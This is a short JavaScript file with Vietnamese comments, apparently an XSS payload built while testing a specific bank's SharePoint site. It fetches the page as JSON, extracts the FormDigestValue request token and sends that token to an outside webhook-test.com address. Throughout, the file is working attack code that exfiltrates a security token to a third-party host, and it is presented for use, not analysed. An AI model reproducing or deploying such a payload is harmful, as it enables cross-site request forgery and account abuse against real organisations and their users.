const DIGEST_API_URL = 'https://sacombankvn.sharepoint.com/sites/QunldnGBM/Lists/TestXSS/AllItems.aspx';
const WEBHOOK_URL = 'https://webhook-test.com/fc090c2a4b9b8347c2761f9e3944e4bc';

function sendToWebhook(digestValue) {
    const webhookReq = new XMLHttpRequest();
    const finalWebhookUrl = WEBHOOK_URL + '?digest=' + encodeURIComponent(digestValue);
    
    // Thêm callback để xác nhận yêu cầu webhook hoàn tất (optional)
    webhookReq.onload = function() {
        console.log("✅ Webhook request finished. Status:", webhookReq.status);
    };

    webhookReq.open('get', finalWebhookUrl, true); 
    webhookReq.send();
}

function handleResponse() {
    let digestValue = null;
    
    try {
        // 1. Phân tích JSON từ phản hồi API (Đã xác nhận là JSON)
        const responseJson = JSON.parse(this.responseText);
        
        // 2. *** SỬA LỖI TẠI ĐÂY: Sử dụng đường dẫn JSON chính xác từ ảnh Burp ***
        digestValue = responseJson.d.FormDigestValue;

    } catch (e) {
        // Lỗi xảy ra nếu không parse được JSON (ví dụ: bị chuyển hướng sang HTML)
        console.error("❌ Lỗi khi xử lý Response (Có thể do JSON không hợp lệ):", e);
        return; 
    }
    
    if (digestValue) {
        // Gửi token đã trích xuất tới Webhook
        sendToWebhook(digestValue);
    } else {
        console.error("❌ ERROR: digestValue là null hoặc undefined.");
    }
}

// Bắt đầu quá trình: Gửi request GET lấy FormDigestValue
const digestReq = new XMLHttpRequest();
digestReq.onload = handleResponse;

digestReq.open('get', DIGEST_API_URL, true); 
// Header này cần thiết để SharePoint trả về JSON thay vì HTML
digestReq.setRequestHeader('Accept', 'application/json;odata=verbose'); 
digestReq.send();
